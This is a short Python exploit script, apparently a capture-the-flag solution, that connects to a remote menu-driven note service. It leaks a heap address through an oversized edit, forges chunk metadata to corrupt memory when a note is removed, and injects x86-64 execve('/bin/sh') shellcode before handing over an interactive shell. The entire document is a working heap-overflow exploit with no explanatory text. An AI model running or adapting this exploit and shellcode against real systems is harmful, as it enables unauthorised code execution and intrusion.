from PwnIOI import *

#s = IOI(['192.168.0.85',1234])
s = IOI(['110.10.212.137',3333])
def add(size,dat):
  s.read_until('>>')
  s.write('L\n')
  s.read_until('size :')
  s.write(str(size)+'\n')
  s.read_until('msg :')
  s.write(dat)
def remove(idx):
  s.read_until('>>')
  s.write('R\n')
  s.read_until('index :')
  s.write(str(idx)+'\n')
def edit(idx,size,dat):
  s.read_until('>>')
  s.write('C\n')
  s.read_until('index :')
  s.write(str(idx)+'\n')
  s.read_until('size :')
  s.write(str(size)+'\n')
  s.read_until('msg :')
  s.write(dat)
add(0x20,'1234')
add(0x20,'1234')
edit(0,0x100,'A'*0x38)
s.read_until('>>')
s.write('V\n')
s.read_until('index :')
s.write('0\n')
heap = u64(s.read_until('[')[-2-4:-2]+'\x00'*4) - 0xa8
log(" heap: 0x%x"%heap)
jump = heap + 0x1b8
edit(0,0x1000,'A'*0x30+p64(0x49)+p64(jump)+p64(0x602070-0x8)+p64(0)*40)
remove(1)
edit(0,0x1000,'A'*0x30+p64(0x49)+p64(jump)+p64(0x602070-0x8)+p64(0)*40+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
s.interact()
